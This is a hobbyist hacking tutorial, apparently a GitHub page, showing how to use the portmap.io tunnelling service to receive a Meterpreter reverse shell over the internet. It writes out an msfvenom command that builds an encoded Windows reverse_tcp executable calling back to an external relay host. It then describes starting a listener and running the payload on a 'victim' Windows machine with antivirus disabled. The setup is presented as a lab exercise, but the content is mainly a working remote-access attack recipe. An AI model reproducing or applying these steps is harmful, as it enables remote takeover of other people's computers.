# The easier way to hack over the internet!

I learnt about this cool service called [portmap.io](https://portmap.io) back in 2018 when I was starting with hacking and wanted something that would be really easy to setup for getting a reverse shell over the internet! Instead of creating your own VPS, or setting up a cloud proxy server to forward traffic, or even a openvpn server by going through a lot of PITA, you can use [portmap.io](https://portmap.io) to easily set up your portforwarding and get going with learning hacking for free!! I think its great of [portmap.io](https://portmap.io) for providing such an awesome service for free! So, without wasting your time and mine, lets get started.

***

## The less fun part

After you register on [portmap.io](https://portmap.io), you'll land on a page like this:-

![image](https://user-images.githubusercontent.com/86168235/128927051-5bbeb967-bb3a-4e75-8fd3-76713f9b1958.png)

**Note**:- If for some reason you didn't land on this page, then you can click on `CONFIGURATIONS` at the top to reach this page.

Click, on the **create new configuration** button. On the next page, you can set any `Name` you want. Keep the `Type` to openvpn and change the protocol to **tcp**(you can use udp too but you've to configure it alike). You can write anything in the `Comment` box. Next, click on `Generate` and then click on `Download` to download the `.ovpn` file. Take a note of the **openvpn** command mentioned, we will use it later.

![image](https://user-images.githubusercontent.com/86168235/128927119-002f539a-9947-49e7-920c-e84448e04726.png)

***

**Next**, click on `MAPPING RULES` at the top of the webpage. On the next page, click on `CREATE NEW RULE`. Next, you just need to add a random port to forward traffic to your PC. Here I added **1337**. Then click on create. 

![image](https://user-images.githubusercontent.com/86168235/128927397-9dfcf604-caf5-4bf7-9e83-9b5c66d14d8e.png)

**Note**:- You can also use "http/https" protocol(**https** requires subscription). But for the sake of simplicity I used **tcp** here.

Finally, take a note of the **hostname** and **port**, which in my case is `random123-33188.portmap.io` and `33188`.

![image](https://user-images.githubusercontent.com/86168235/128928265-9863f4a9-374a-4ed8-ac4d-f0c6a34c6e2c.png)


***

## The fun part!

On **kali linux**(I use kali, dunno about you🙂), use **msfvenom** to create a payload as follows:-
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=random123-33188.portmap.io LPORT=33188 -f exe -o portmap.exe -e x64/xor_dynamic
```

![image](https://user-images.githubusercontent.com/86168235/128928364-dc24c900-172a-44da-84e5-cd263ff5e2a0.png)

Here the LHOST and LPORT are the **hostname** and **port** you took note from [portmap.io](https://portmap.io).

**Next**, start the **openvpn** connection to forward traffic to your machine(use the openvpn command you noticed earlier).

![image](https://user-images.githubusercontent.com/86168235/128928557-2807cd59-150c-4f4d-8c1f-40d5cbd9d92c.png)

Take a note of the ip address of the `tun0`(or your openvpn tunnel interface).

![image](https://user-images.githubusercontent.com/86168235/128928630-2da73f20-5c23-4ac9-8b2e-a99ac0da8c01.png)

Now, set up a meterpreter listener as follows:-

![image](https://user-images.githubusercontent.com/86168235/128928689-042d19fd-3c44-4f20-8821-366d2e06df9a.png)

Here, lhost is tun0 interface ip, lport is the port we set on [portmap.io](https://portmap.io), payload is what we choose with **msfvenom**. 

**Next**, transfer the `portmap.exe` exploit to victim windows machine and execute it. Here, I've disabled **AV** before running the executable.

![image](https://user-images.githubusercontent.com/86168235/128928898-4d6bc6d9-b048-4eeb-9d1c-29a09168d32c.png)


Next, you'll see what I call **the love of life**😍🥰, the classic **meterpreter reverse shell!!!**

![image](https://user-images.githubusercontent.com/86168235/128928966-8bf50f23-9de5-4706-ba34-0325a7f859c3.png)


**Note**:- Here, my kali machine is connected to my home network and the windows machine is connected to my Mobile hotspot.



# Credits

Thanks to [portmap.io](https://portmap.io), for creating such an awesome service. Their free tier provides limited functionality and you can create only one mapping rule. If you need more, then consider subscribing. Happy hacking!




